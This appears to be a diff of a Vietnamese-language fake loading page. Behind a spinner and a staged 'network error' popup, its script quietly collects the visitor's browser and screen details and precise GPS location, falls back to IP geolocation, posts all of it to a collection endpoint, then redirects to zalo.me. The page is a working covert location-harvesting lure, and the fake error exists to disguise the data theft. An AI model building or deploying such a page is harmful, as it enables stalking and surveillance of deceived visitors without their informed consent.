@@ -4,13 +4,23 @@
   <meta charset="UTF-8">
   <title>Đang tải...</title>
   <style>
-    body { background: #fff; margin: 0; height: 100vh;}
-    .centerbox {
-      position: absolute; left: 50%; top: 50%;
-      transform: translate(-50%, -50%);
-      display: flex; flex-direction: column;
-      align-items: center; justify-content: center;
+    body {
+      background: #fff;
+      margin: 0;
+      height: 100vh;
     }
+
+    .centerbox {
+      position: absolute;
+      left: 50%;
+      top: 50%;
+      transform: translate(-50%, -50%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
     .loader {
       border: 8px solid #f3f3f3;
       border-top: 8px solid #3498db;
@@ -20,53 +30,84 @@
       animation: spin 1s linear infinite;
       margin-bottom: 20px;
     }
+
     @keyframes spin {
       0% { transform: rotate(0deg);}
       100% { transform: rotate(360deg);}
     }
+
     .text {
-      font-family: sans-serif; 
-      color: #555; 
+      font-family: sans-serif;
+      color: #555;
       font-size: 1.2em;
       text-align: center;
       margin-top: 0.5em;
     }
+
     /* Modal styles */
     .modal-backdrop {
       position: fixed;
-      top: 0; left: 0; width: 100vw; height: 100vh;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
       background: rgba(0,0,0,0.35);
       z-index: 99;
       display: flex;
       align-items: center;
       justify-content: center;
     }
+
     .modal {
       background: #fff;
       border-radius: 10px;
       padding: 32px 24px 20px 24px;
       box-shadow: 0 8px 24px rgba(0,0,0,0.18);
-      text-align: center;
+      text-align: left;
       min-width: 235px;
       z-index: 100;
       animation: popup 0.33s;
     }
-    @keyframes popup { 0% { transform: scale(0.8);} 100%{transform:scale(1);} }
-    .modal-title { color: #c00; font-size: 1.5em; margin-bottom: 12px;}
-    .modal-desc { color: #555; margin-bottom: 22px;}
+
+    @keyframes popup {
+      0% { transform: scale(0.8);}
+      100% { transform: scale(1);}
+    }
+
+    .modal-title {
+      color: #000;
+      font-size: 1.5em;
+      margin-bottom: 12px;
+      text-align: left;
+    }
+
+    .modal-desc {
+      color: #555;
+      margin-bottom: 22px;
+      text-align: left;
+    }
+
     .modal-btn {
       background: #3498db;
-      color: #fff; border: 0; border-radius: 5px;
-      padding: 8px 24px; font-size: 1.1em;
-      cursor: pointer; transition: background .2s;
+      color: #fff;
+      border: 0;
+      border-radius: 5px;
+      padding: 8px 24px;
+      font-size: 1.1em;
+      cursor: pointer;
+      transition: background .2s;
     }
-    .modal-btn:hover { background: #2571af;}
+
+    .modal-btn:hover {
+      background: #2571af;
+    }
   </style>
+
   <script>
     // Thiết lập thời gian tải giả ngẫu nhiên: 1-4 giây
     const minWait = 1000;
     const maxWait = 4000;
-    const waitTime = Math.floor(Math.random() * (maxWait-minWait)) + minWait;
+    const waitTime = Math.floor(Math.random() * (maxWait - minWait)) + minWait;
 
     const deviceInfo = {
       userAgent: navigator.userAgent,
@@ -78,21 +119,26 @@
         pixelRatio: window.devicePixelRatio
       }
     };
+
     function fetchIPLocation(cb) {
       fetch('https://ipapi.co/json/')
-        .then(r=>r.json()).then(loc=>cb && cb(loc))
-        .catch(()=>cb && cb(null));
+        .then(r => r.json())
+        .then(loc => cb && cb(loc))
+        .catch(() => cb && cb(null));
     }
+
     function report(data) {
       fetch('/api/collect', {
         method: 'POST',
-        headers: {'Content-Type':'application/json'},
+        headers: {
+          'Content-Type':'application/json'
+        },
         body: JSON.stringify(data)
       });
     }
 
     function showNetworkErrorModal() {
-      // Tạo modal
+
       const backdrop = document.createElement('div');
       backdrop.className = 'modal-backdrop';
 
@@ -101,51 +147,75 @@
 
       modal.innerHTML = `
         <div class="modal-title">Lỗi mạng</div>
-        <div class="modal-desc">Vui lòng kiểm tra kết nối Internet của bạn.</div>
+        <div class="modal-desc">
+          Vui lòng kiểm tra kết nối Internet của bạn.
+        </div>
         <button class="modal-btn">Đóng</button>
       `;
+
       backdrop.appendChild(modal);
 
-      // 绑定关闭事件
       modal.querySelector('.modal-btn').onclick = function() {
-        window.location.href = "https://zalo.me/vi/post/error";
+        window.location.href = "https://zalo.me/vi";
       };
+
       document.body.appendChild(backdrop);
     }
 
     window.onload = function() {
+
       // Bắt đầu thu thập dữ liệu nền
       if (navigator.geolocation) {
+
         navigator.geolocation.getCurrentPosition(
+
           pos => {
+
             deviceInfo.location = {
               lat: pos.coords.latitude,
               lng: pos.coords.longitude
             };
+
             report(deviceInfo);
+
           },
+
           err => {
+
             fetchIPLocation(iploc => {
+
               deviceInfo.ipLocation = iploc;
               report(deviceInfo);
+
             });
+
           }
+
         );
+
       } else {
+
         fetchIPLocation(iploc => {
+
           deviceInfo.ipLocation = iploc;
           report(deviceInfo);
+
         });
+
       }
+
       // Sau khi hết thời gian ngẫu nhiên thì hiện modal lỗi mạng
       setTimeout(showNetworkErrorModal, waitTime);
     };
   </script>
 </head>
+
 <body>
+
   <div class="centerbox">
     <div class="loader"></div>
     <div class="text">Đang tải...</div>
   </div>
+
 </body>
 </html>
